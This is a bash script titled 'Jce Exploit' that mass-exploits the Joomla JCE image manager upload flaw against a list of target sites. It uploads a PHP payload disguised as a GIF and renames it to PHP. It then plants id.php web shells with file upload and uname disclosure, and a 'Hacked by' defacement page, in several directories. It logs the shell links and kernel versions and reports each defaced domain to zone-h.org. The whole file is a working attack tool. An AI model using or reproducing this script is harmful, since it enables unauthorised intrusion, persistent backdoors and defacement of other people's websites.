#!/bin/bash
# Jce Exploit
# Coded = d3b~X
# Edited = 6 Feb 2014
# Publish = 17 Apr 2014

if [ ! -d tmp ];then
mkdir tmp
fi
if [ ! -d log ];then
mkdir log
fi

Warna(){
B="\033[1m"
MERAH="\e[1;31m"
HIJAU="\e[1;32m"
BIRU="\e[1;34m"
NOR="\e[0m"
}

cat > xx.gif <<_EOF
<?php 
error_reporting(0);
function RandomString(\$length = 5) {
    \$characters = 'abcdefghijklmnopqrstuvwxyz';
    \$randomS = '';
    for (\$i = 0; \$i < \$length; \$i++) {
        \$randomS .= \$characters[rand(0, strlen(\$characters) - 1)];
    }
    return \$randomS;
}
\$ndom = RandomString();
\$file  = '<?php if(isset(\$_GET["'.\$ndom.'"])){echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if(\$_POST["v"]==up){if(@copy(\$_FILES["f"]["tmp_name"],\$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".\$_FILES["f"]["name"];}else{echo"<b>gagal";}}}?>';
\$file .= '<title>Hacked by Gian Sopiana</title><center><div id=q>GHOSTSEC-TEAM<br><font size=2>SultanHaikal - d3b~X - Brian Kamikaze - Coupdegrace - Mdn_newbie - Index Php
<style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}';
\$r=fopen("id.php", "w");fwrite(\$r,\$file);fclose(\$r);
\$r=fopen("../id.php", "w");fwrite(\$r,\$file);fclose(\$r);
\$r=fopen("../../id.php", "w");fwrite(\$r,\$file);fclose(\$r);
\$r=fopen("../../../id.php", "w");fwrite(\$r,\$file);fclose(\$r);
\$r=fopen("../../tmp/id.php", "w");fwrite(\$r,\$file);fclose(\$r);
\$r=fopen("../../images/id.php", "w");fwrite(\$r,\$file);fclose(\$r);
\$r=fopen("../tmp/id.php", "w");fwrite(\$r,\$file);fclose(\$r);
\$r=fopen("../images/id.php", "w");fwrite(\$r,\$file);fclose(\$r);
echo "Randomnya:".\$ndom;
\$r=fopen("x.php", "w");fwrite(\$r,"");fclose(\$r);
if(file_exists("x.php")) unlink("x.php");
?>
?>
_EOF

ZoneH(){
if [ -f "tmp/${FCK}empes.txt" ];then
   urlnya=$(cat tmp/${FCK}empes.txt)
       curl --silent -d "defacer=GHOSTSEC-TEAM&domain1=${urlnya}&hackmode=15&reason=1" \
        --header "Host: www.zone-h.org" \
        --header "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0" \
        --header "Accept-Language: en-US,en;q=0.5" \
        --header "Connection: keep-alive" \
        --header "Referer: http://zone-h.org/notify/single" \
        --request POST "http://zone-h.org/notify/single" -o tmp/${FCK}/result1.txt >/dev/null 
        cat tmp/${FCK}result1.txt | sed ':a;N;$!ba;s/\n/ /g' | awk '{gsub("<li>","\n")}1' | awk '{gsub("</li>","\n")}1' | grep "name=\"domain" | awk '{gsub(">","?")}1' | awk '{gsub("<","?")}1' | cut -d '?' -f 5 > tmp/${FCK}Result.txt
            FILEDX="tmp/${FCK}Result.txt"
           RDOM1=$(sed -n '1p' < $FILEDX)
            echo $RDOM1 | grep -i "OK" >> /dev/null;warnai=$?
          if [ $warnai -eq 0 ];then
           WARNA="\033[1m\e[1;32m[OK]\E[0m"
           echo "$urlnya" >> log/postOK.log
            else
           WARNA="\033[1m\e[1;31m[ERROR]\E[0m"
           echo "$urlnya" >> log/postError.log
          fi
    echo -e "[+] Zone-H : $urlnya $WARNA" 
    echo "$urlnya" >> defaced.txt 
   rm -f tmp/${FCK}empes.txt
   rm -f tmp/${FCK}
   break
fi
}

GetURL(){
echo $TARGET > tmp/${FCK}target.txt
cat tmp/${FCK}target.txt | awk '{gsub("http://","")}1' | awk '{gsub("https://","")}1' > tmp/${FCK}.url
HOSTX=$(cat "tmp/${FCK}.url" | cut -d "/" -f 1)
cat "tmp/${FCK}.url" | grep ":" >> /dev/null;check5=$?
echo "/" > tmp/${FCK}.vuln
echo "/web/" >> tmp/${FCK}.vuln
echo "/joomla/" >> tmp/${FCK}.vuln
}

UploadC(){
curl --silent --max-time 10 --connect-timeout 10 -o tmp/${FCK}resp.txt \
-H "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de-LI; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)" \
-H "Accept-Language: en-us,en;q=0.5" \
-H "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" \
-H "Connection: Close" \
-H "Proxy-Connection: close" \
-F "upload-dir=${2}" \
-F "upload-overwrite=0" \
-F "action=upload" \
-F "Filedata=@xx.gif" \
--request POST  "http://${1}index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form" 
}


Json(){
curl --silent --max-time 10 --connect-timeout 10 -o tmp/${FCK}resp.txt \
-H "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de-LI; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)" \
-H "Accept-Language: en-us,en;q=0.5" \
-H "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" \
-H "X-Request: JSON" \
-H "Connection: Close" \
-H "Proxy-Connection: close" \
-F "${2}" \
--request POST  "http://${1}index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw" 
}

Shell(){
  echo "+ Upload shell"
  UploadC ${HOSTX}${XDIR} /../
    curl --silent --max-time 10 --connect-timeout 10 "http://${HOSTX}${XDIR}images/xx.gif" -o tmp/${FCK}gck.txt
   cat tmp/${FCK}gck.txt | grep -i "Hacked by Gian Sopiana" >/dev/null;gck=$?
    if [ $gck -eq 0 ];then
    echo " + Gif created"
     echo " + Rename to x.php"
    Json ${HOSTX}${XDIR} "json={\"fn\":\"folderRename\",\"args\":[\"../xx.gif\",\"x.php\"]}"
    curl --silent --max-time 10 --connect-timeout 10 "http://${HOSTX}${XDIR}images/x.php" -o tmp/${FCK}gck1.txt
           cat tmp/${FCK}gck1.txt | grep -i "Randomnya:" >/dev/null;gck1=$?
         if [ $gck1 -eq 0 ];then
         KY=$(cat tmp/${FCK}gck1.txt | grep "Randomnya:" | cut -d ':' -f 2)
         echo "[+] Shell OK -> http://${HOSTX}${XDIR}images/x.php"
         curl --silent --max-time 10 --connect-timeout 10 "http://${HOSTX}/id.php?${KY}" -o tmp/${FCK}w00t
         cat tmp/${FCK}w00t | grep -i "Hacked by" >/dev/null;cwot=$?
           if [ $cwot -eq 0 ];then
             echo " [+] Link = http://${HOSTX}/id.php?${KY}"
             echo "http://${HOSTX}/id.php?${KY}" >> Shell.txt
             Kernel=$(cat tmp/${FCK}w00t | grep -i "uname" | cut -d '[' -f 2 | awk '{gsub("uname]","")}1')
             echo " [+] Kernel = $Kernel"
             echo "$Kernel" >> Shell.txt
             echo "================================" >> Shell.txt
             rm -f tmp/${FCK}y.txt
             echo "http://${HOSTX}/id.php" > tmp/${FCK}empes.txt
            ZoneH
        fi
         curl --silent --max-time 10 --connect-timeout 10 "http://${HOSTX}${XDIR}images/id.php?${KY}" -o tmp/${FCK}w00t
         cat tmp/${FCK}w00t | grep -i "Hacked by" >/dev/null;cwot=$?
           if [ $cwot -eq 0 ];then
             echo " [+] Link = http://${HOSTX}${XDIR}images/id.php?${KY}"
             echo "http://${HOSTX}${XDIR}images/id.php?${KY}" >> Shell.txt
             Kernel=$(cat tmp/${FCK}w00t | grep -i "uname" | cut -d '[' -f 2 | awk '{gsub("uname]","")}1')
             echo " [+] Kernel = $Kernel"
             echo "$Kernel" >> Shell.txt
             echo "================================" >> Shell.txt
             rm -f tmp/${FCK}y.txt
             echo "http://${HOSTX}${XDIR}images/id.php" > tmp/${FCK}empes.txt
            ZoneH
        fi
         fi
      fi
  # u can add others method here          
}


CheckV(){
echo "[+] http://${HOSTX}${XDIR} <--exploit"
curl --silent --max-time 10 --connect-timeout 10 "http://${HOSTX}${XDIR}index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&action=upload" -o "tmp/${FCK}.txt";
if [ -f "tmp/${FCK}.txt" ];then
  cat tmp/${FCK}.txt | grep ":true" >> /dev/null;check1=$?
    if [ $check1 -eq 1 ];then
    echo "${HOSTX} -> Not Exploitable"
    rm -f tmp/${FCK}*
    break
     else
     echo "http://${HOSTX}${XDIR}" >tmp/${FCK}xv.txt
    fi
fi
}


read -p "Masukan list target = " TARGETX
if [ ! -f $TARGETX ];then
  echo "Targetnya nggak ada"
  exit
fi
    for TARGET in `cat $TARGETX`
    do
        function random () {
          local randomLength
          randomLength=20
          hasil=</dev/urandom /usr/bin/tr -dc a-z | head -c $randomLength
          echo $hasil
        }
        FCK=`random`
        Warna;GetURL
         echo $HOSTX >> load.txt
          for XDIR in `cat tmp/${FCK}.vuln`
           do
            CheckV
            Shell
          done    
        rm -f tmp/${FCK}*                 
    done
